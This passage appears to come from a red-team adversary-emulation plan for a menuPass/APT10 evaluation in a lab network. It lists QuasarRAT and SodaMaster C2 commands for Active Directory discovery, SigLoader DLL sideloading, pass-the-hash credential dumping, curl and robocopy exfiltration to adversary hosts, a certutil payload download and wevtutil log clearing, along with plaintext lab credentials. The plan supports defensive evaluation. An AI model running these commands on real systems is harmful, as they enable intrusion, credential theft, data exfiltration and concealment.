`parrotmon (10.10.10.4)`, port scan the workstations of the Subsidiary A network.

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 5, "range": "10.10.20.0/24", "ports":[22, 53, 80, 445, 3389], "timeout": 300}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute nslookup against the active hosts. **Wait until each command has returned before executing the next**.

  1. `phantomon`

        ```
        ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.11"}'
        ```

  2. `ghostmon`

        ```
        ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.22"}'
        ```

  3. `cecilmon`

        ```
        ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.23"}'
        ```

### :mag: Reference Code & Reporting

1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | QuasarRAT execute commands | [ExecuteProcess](../Resources/Quasar/Quasar.Client/Messages/TaskManagerHandler.cs#L179) | T1106 Native API | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | QuasarRAT creates folder `$RCXNYCG` in kizumi.da's Recycle Bin | - | T1074.001 Data Staged: Local Data Staging | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf) |
   | Execute ntdsutil.exe | - | T1003.003 OS Credential Dumping: NTDS | [JSAC-jpcert](https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf)<br>[Kaspersky](https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf) |
   | Exfiltrate ntds.dit from Recycle Bin | - | T1041 Exfiltration Over C2 Channel | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf) |
   | Exfiltrate SYSTEM from Recycle Bin | - | T1041 Exfiltration Over C2 Channel | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf) |
   | Port scan Subsidiary A network | [PortScanHandler.cs](../Resources/Quasar/Quasar.Client/Messages/PortScanHandler.cs) | T1046 Network Service Discovery | [Kaspersky](https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf) |
   | Nslookup hosts | - | T1016 System Network Configuration Discovery | [Kaspersky](https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf) |

 </details>

<br>

## Step 6 - Preparation for Lateral Movement onto Subsidiary B Network

### :microphone: Voice Track

menuPass performs additional Active Directory enumeration, through which the
following are identified:

* A trusted domain DIGIREVENGE
* A bastion workstation `kimeramon (10.20.20.11)` in DIGIREVENGE allowing authentication for Subsidiary A users
* Hosts and users within DIGIREVENGE

Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, menuPass downloads SigLoader and its necessary
components to the Subsidiary A Domain Controller, then moves them to the
bastion workstation `kimeramon (10.20.20.11)`.

Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, menuPass then remotely creates a service on the
bastion workstation `kimeramon (10.20.20.11)` to execute a legitimate binary
that will sideload SigLoader.

### ☣️ Procedures

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
the active hosts

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(objectCategory=computer)\" -attr *"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
trusted domains

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(objectCategory=trusteddomain)\" -attr *"}'
  ```

  * Ensure `DIGIREVENGE` is listed as a trusted domain

  ```
  grep 'flatname: digirevenge' logs.txt -ia -C 10
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
the active hosts within DIGIREVENGE

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(objectCategory=computer)\" -domain DIGIREVENGE -attr *"}'
  ```

  * Ensure `kimeramon (10.20.20.11)` is listed in the output

  ```
  grep 'Workstation Contractor Bastion' logs.txt -ia
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
the users within DIGIREVENGE

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(&(objectclass=User)(objectCategory=Person))\" -domain DIGIREVENGE -attr *"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, download SigLoader and its necessary components
(SodaMaster version) and move them to the bastion workstation
`kimeramon (10.20.20.11)`. **Wait until each command has returned before
executing the next**.
  * SigLoader layer 1

    ```
    ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer1.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\C$\\Program Files\\Notepad++\\VERSION.dll"}'
    ```

  * SigLoader layer 2

    ```
    ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer2.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\admin$\\System32\\hkp.dll"}'
    ```

  * SodaMaster

    ```
    ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\sodamaster.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\admin$\\System32\\win64_tools.dll"}'
    ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, remotely create a service on the bastion workstation
`kimeramon (10.20.20.11)` to execute a legitimate binary that will sideload
SigLoader

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"seq": 1, "type": 1, "proc_path": "sc.exe", "proc_args": "\\\\kimeramon.digirevenge.net create Notepad binpath= \"cmd /c \\\"C:\\Program Files\\Notepad++\\notepad++.exe\\\"\" error= ignore start= demand"}'
  ```

### :mag: Reference Code & Reporting

1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>
1. <https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | Execute dsquery to enumerate active host information | - | T1018 Remote System Discovery | [Kaspersky](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf) |
   | Execute dsquery to enumerate trusted domains | - | T1482 Domain Trust Discovery | [Kaspersky](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf) |
   | Execute dsquery to enumerate user information | - | T1087.002 Account Discovery: Domain Account | [Kaspersky](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/11/09055246/Modern-Asian-APT-groups-TTPs_report_eng.pdf) |
   | QuasarRAT downloads files | [Execute File Download](../Resources/Quasar/Quasar.Client/Messages/FileManagerHandler.cs#L334) | T1105 Ingress Tool Transfer | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Dropped files were modified to contain shellcode | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
   | Dropped files' signatures are still valid | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1553.002 Subvert Trust Controls: Code Signing | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with.)
   | QuasarRAT execute commands | [ExecuteProcess](../Resources/Quasar/Quasar.Client/Messages/TaskManagerHandler.cs#L179) | T1106 Native API | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Create service | - | T1543.003 Create or Modify System Process: Windows Service | [Mandiant](https://www.mandiant.com/resources/blog/apt10-menupass-group) |

 </details>

<br>

## Step 7 - Lateral Movement onto Subsidiary B Network

### :microphone: Voice Track

Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, menuPass remotely executes the created service on the
bastion workstation `kimeramon (10.20.20.11)` to execute a legitimate binary
that will sideload SigLoader.

On execution, SigLoader will again perform its layered loading, with the final
loaded payload this time being SodaMaster. Once SodaMaster is executed, it will
perform the following initialization steps:
* Perform automated host discovery
* Execute anti-sandbox checks
* Add itself to Windows Defender's whitelist
* Check Defender configurations
* Establish C2 communication using a redirector at
`notepad-plusplus[.]eu (121.93.44.121)`

Eventually, a file server administrator `kmimi` from
Subsidiary B's network RDPs in to the bastion workstation `kimeramon (10.20.20.11)`
to perform tasks then disconnects from their session when complete.

### ☣️ Procedures

* Using the QuasarRAT implant on the Domain Controller, remotely execute the
created service

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"seq": 1, "type": 1, "proc_path": "sc.exe", "proc_args": "\\\\kimeramon.digirevenge.net start Notepad"}'
  ```

  * This command should return `FAILED 1053`. This is expected because
  notepad++.exe is not configured as a service binary that would properly
  respond to the service manager. However, notepad++.exe *will still execute*
  and *should remain running* even after the command returns the failed message.

* Confirm C2 registration of SodaMaster

> :fast_forward: Emulate the following legitimate user activity:
>
> * :arrow_right: initiate an RDP session from the jumpbox `homelander (176.59.17.22)` to `kimeramon (10.20.20.11)` as the file server administrator:
>
>   | Username | Password |
>   | -------- | -------- |
>   | DIGIREVENGE\kmimi | cHjc3p3hJHJYPUzT@ |
>
> * Open Command Prompt, mount the file share:
>
>    ```
>    net use F: \\10.20.10.23\F$ /persistent:yes
>    ```
>
> * Check the drive was mounted properly:
>
>    ```
>    net use
>    ```
>
> * Disconnect from RDP and you should return to `homelander (176.59.17.22)`
>
> :fast_forward: Resume red team activity

### :mag: Reference Code & Reporting

1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>
1. <https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | Execute Notepad++.exe to perform DLL sideloading | - | T1574.002 Hijack Execution Flow: DLL Side-Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data)
   | SigLoader decrypts shellcode (combination of XOR/AES/DES) | [decrypt](../Resources/SigLoader/src/layer1_loader.cpp#L272) | T1140 Deobfuscate/Decode Files or Information | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data)
   | SigLoader reflectively loads and executes SodaMaster | [run_code](../Resources/SigLoader/src/layer1_loader.cpp#L75) | T1620 Reflective Code Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=modified%20P8RAT%20accordingly.-,SodaMaster,-Another%20payload%20of)
   | SodaMaster uses stackstrings for obfuscation | [StackStrings documentation](../Resources/SodaMaster/README.md#stackstrings) | T1027 Obfuscated Files or Information | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
   | SodaMaster uses native APIs | [SodaMaster](../Resources/SodaMaster/SodaMaster-DLL) | T1106 Native API | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster collects username via GetUserName API | [GetCurrentUserName](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L62) | T1033 System Owner/User Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster collects hostname via GetComputerNameA API | [GetCurrentComputerName](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L41) | T1082 System Information Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster collects processor architecture and build information via GetSystemInfo and GetProductInfo APIs | [GetSMSysInfo](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L113) | T1082 System Information Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster checks Model-Specific Register range used by hypervisors (anti-vm) | [MSRCheck](../Resources/SodaMaster/SodaMaster-DLL/AVM.cpp#L155) | T1497.001 System Checks | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster checks number of CPU cores is not 1 via GetSysInfo API (anti-vm) | [CheckProcCount](../Resources/SodaMaster/SodaMaster-DLL/AVM.cpp#L31) | T1497.001 System Checks | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster checks running processes via CreateToolhelp32Snapshot API (anti-vm) | [CheckVMProcess](../Resources/SodaMaster/SodaMaster-DLL/AVM.cpp#L57) | T1497.001 System Checks | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster checks registry via RegOpenKeyEx API (anti-vm) | [RegistryCheck](../Resources/SodaMaster/SodaMaster-DLL/AVM.cpp#L126) | T1082 System Information Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster checks expected time between sleeps (anti-vm) | [CheckExpectedTime](../Resources/SodaMaster/SodaMaster-DLL/AVM.cpp#L11) | T1497.003 Time Based Evasion | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes PowerShell via CreateProcess API | [ExecutePowerShellCmd](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L349) | T1059.001 Command and Scripting Interpreter: PowerShell | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster adds itself to Defender's whitelist via Add-MpPreference | [defenderWhitelist](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L298) | T1562.001 Impair Defenses: Disable or Modify Tools | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster communicates over TCP | [SendData](../Resources/SodaMaster/SodaMaster-DLL/Comslib.cpp#L172) | T1095 Non-Application Layer Protocol | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |

 </details>

<br>

## Step 8 - Discovery and Additional Privilege Escalation

### :microphone: Voice Track

menuPass uses SodaMaster to execute discovery actions, which will result in
menuPass discovering a file server `alphamon (10.20.10.23)` and its
administrator `kmimi` on Subsidiary B’s network. SodaMaster creates threads for
executing downloaded shellcode in memory.

To prepare to laterally move onto the file server, menuPass uses SodaMaster to
download `secretsdump.exe`, which is Impacket's `secretsdump.py` converted to
an executable binary using PyInstaller. SodaMaster executes `secretsdump.exe`
to dump the SYSTEM/SECURITY/SAM hives on the bastion workstation `kimeramon (10.20.20.11)`,
authenticating using the NTLM hash for `kizumi.da` collected
previously.

The retrieved dump contains a cached domain login for `kmimi`, the file
server administrator in Subsidiary B which is cracked to reveal `kmimi`'s
plaintext password.

### ☣️ Procedures

* Using SodaMaster, execute the discovery actions shellcode. **Wait until each command has returned before executing the next.**
  * `netstat -anop tcp`

    ```
    ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"netstat -anop tcp"}'
    ```

    * :heavy_exclamation_mark: Verify a network connection to `alphamon (10.20.10.23)` port 445

  * `tasklist /v`

    ```
    ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"tasklist /v"}'
    ```

    * :heavy_exclamation_mark: Verify that the enumerated processes output contains a process running under `kmimi`

  * `net view 10.20.10.23 /all`

    ```
    ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"net view 10.20.10.23 /all"}'
    ```

    * :heavy_exclamation_mark: Verify the output contains a list of file shares with the file server host `alphamon (10.20.10.23)`

  * `net user kmimi /domain`

    ```
    ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"net user kmimi /domain"}'
    ```

    * :heavy_exclamation_mark: Verify that `File Server Admins` is listed as one of the groups that `kmimi` is a member of

* Using SodaMaster, download and execute `secretsdump.exe`, using the NTLM hash for `kizumi.da`
collected in step 5

  ```
  ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "payload":"secretsdump.exe", "payloadPath":"C:/Windows/Temp", "args":"C:/Windows/Temp/secretsdump.exe digirunaway/kizumi.da@127.0.0.1 -hashes :6265fbabbdaa3ee71df61bd9f3c77d68 > C:/Windows/Temp/tmp4541 && echo Done"}'
  ```

* Using SodaMaster, curl the secretsdump output to exfiltrate the file

    ```
    ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"curl -X POST -H 'filename:sdump.txt' --data-binary @C:/Windows/Temp/tmp4541 http://ten-cent.us/uploads"}'
    ```

* Confirm secretsdump output file was exfiltrated in the C2 server log then check for presence of a cached domain login for `kmimi` in the output:

    ```
    cat files/sdump.txt | grep -a kmimi
    ```

> :information_source: This hash is cracked to retrieve the plaintext password
> for `kmimi`

### :mag: Reference Code & Reporting

1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks>
1. <https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | SodaMaster execute commands via sRDI | [ExecShellcode](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L196) | T1620 Reflective Code Loading |  [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes `netstat -anop tcp` | - | T1049 System Network Connections Discovery |  [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes `tasklist /v` | - | T1057 Process Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes `net view 10.20.10.23 /all` | - | T1135 Network Share Discovery | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes `net user kmimi /domain` | - | T1087.002 Account Discovery: Domain Account | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster downloads secretsdump.exe | [ExecShellcode](../Resources/SodaMaster/SodaMaster-DLL/Core.cpp#L196) | T1105 Ingress Tool Transfer | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | SodaMaster executes secretsdump.exe with kizumi.da hash | - | T1550.002 Use Alternate Authentication Material: Pass the Hash | [JSAC-jpcert](http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf) |
   | secretsdump.exe dumps local SAM hashes | [impacket](../Resources/impacket/README.md) | T1003.002 OS Credential Dumping: Security Account Manager | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28) |
   | secretsdump.exe dumps cached domain login information | [impacket](../Resources/impacket/README.md) | T1003.005 OS Credential Dumping: Cached Domain Credentials | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28) |
   | secretsdump.exe dumps LSA secrets | [impacket](../Resources/impacket/README.md) | T1003.004 OS Credential Dumping: LSA Secrets | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28) |
   | SodaMaster executes curl to exfiltrate the dump output | - | T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | [pwc](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=28) |

 </details>

<br>

## Step 9 - Data Collection & Exfiltration

### :microphone: Voice Track

menuPass uses SodaMaster to first download a modified `WMIexec.vbs` to
`C:\Users\kmimi\appdata\local\temp\w.vbs` on the bastion workstation `kimeramon (10.20.20.11)`.
Then, menuPass executes `w.vbs` with the cracked plaintext password of the file
server administrator `kmimi` to connect to the file server `alphamon (10.20.10.23)`.

menuPass uses the reverse shell on the file server `alphamon (10.20.10.23)` to
execute several PowerShell commands to enumerate and identify files of
interest. menuPass then uses certutil to download WinRAR.exe to the file server
`alphamon (10.20.10.23)` to `C:\Program Files\conhost.exe`. Then, menuPass
executes WinRAR to compress files of interest. menuPass exfiltrates the
compressed files using RoboCopy to an adversary controlled SMB share.

Once exfiltration of files is complete, menuPass clears the Windows event logs
on the file server and command history.

### ☣️ Procedures

* :arrow_right: Return to the RDP session on the Kali attack host `kraken (176.59.1.18)`

* Open a terminal window and start the SMB server:

  ```
  sudo mkdir /opt/menu_pass/digirevenge
  sudo impacket-smbserver digirevenge /opt/menu_pass/digirevenge -smb2support
  ```

* Using SodaMaster, download `WMIexec.vbs` to the bastion workstation
`kimeramon (10.20.20.11)`

  ```
  ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "payload":"w.vbs", "payloadPath":"C:/Users/kmimi/appdata/local/temp/"}'
  ```

* Initiate an RDP session to the bastion workstation `kimeramon (10.20.20.11)`
using the file server administrator `kmimi` credentials to authenticate.

  | Username | Password |
  | -------- | -------- |
  | DIGIREVENGE\kmimi | cHjc3p3hJHJYPUzT@ |

* Using the RDP session, open a Command Prompt
then execute `WMIexec.vbs` with the file server administrator `kmimi`
credentials targeting the file server `alphamon (10.20.10.23)`

  ```
  cscript.exe C:\Users\kmimi\appdata\local\temp\w.vbs /shell 10.20.10.23 DIGIREVENGE\kmimi cHjc3p3hJHJYPUzT@
  ```

* Using the reverse shell to the file server, execute PowerShell file discovery
commands

   ```
   powershell.exe "Get-SmbShare | foreach-object -process { if($_.Path) { dir $_.Path } }" -wait4145
   ```

* Using the reverse shell to the file server, execute `certutil.exe` to
download `WinRAR.exe` to the file server from the adversary server

  ```
  certutil.exe -urlcache -f http://ten-cent.us/files/giag1.crl "C:\Program Files\conhost.exe"
  ```

* Using the reverse shell to the file server, execute `WinRAR.exe` to compress
each file path containing files of interest

  ```
  cd "C:\Program Files"
  ```

  ```
  conhost.exe a -r C:\Windows\Temp\wmilog.rar F:\data
  ```

* Using the reverse shell to the file server, mount an adversary controlled
SMB share then execute the `RoboCopy` utility to exfiltrate the RAR to the
adversary controlled SMB share

  ```
  net use \\manhwajia.au\digirevenge & robocopy C:\Windows\Temp \\manhwajia.au\digirevenge wmilog.rar /mt /z
  ```

* :arrow_right: Switch to an open terminal in Kali and confirm the exfiltration was successful

    ```
    ls -l /opt/menu_pass/digirevenge
    ```

* :arrow_right: Return to the RDP with the reverse shell and, using the reverse shell to the file server, execute the `wevtutil` utility to
clear Windows event logs

  ```
  for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1" -wait4145
  ```

* Exit the shell

  ```
  exit
  ```

* Close the Command Prompt then disconnect from the RDP session

### :mag: Reference Code & Reporting

1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
